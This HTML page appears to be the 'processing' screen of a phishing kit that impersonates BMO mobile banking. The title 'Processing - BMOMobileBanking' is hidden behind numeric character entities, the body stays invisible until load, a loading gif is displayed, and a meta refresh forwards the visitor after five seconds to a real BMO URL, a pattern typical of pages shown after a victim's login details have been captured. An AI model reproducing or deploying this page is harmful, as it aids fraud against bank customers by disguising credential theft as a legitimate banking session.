<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#114;&#111;&#99;&#101;&#115;&#115;&#105;&#110;&#103;&#32;&#45;&#32;&#66;&#77;&#79;&#77;&#111;&#98;&#105;&#108;&#101;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<html><meta http-equiv="Refresh" content="05; url=https://m2.bmo.com/BMOMobile/apps/services/www/BMOMobileBanking/mobilewebapp/default/BMOMobileBanking.html"></html>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
</head>

<body style="visibility:hidden" onload="unhideBody()"  bgColor="#006EB1">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:394px; height:180px; z-index:0"><img src="images/om6.png" alt="" title="" border=0 width=394 height=180></div>

<div id="image2" style="position:absolute; overflow:hidden; left:113px; top:280px; width:142px; height:142px; z-index:1"><img src="images/load.gif" alt="" title="" border=0 width=142 height=142></div>


</body>
</html>
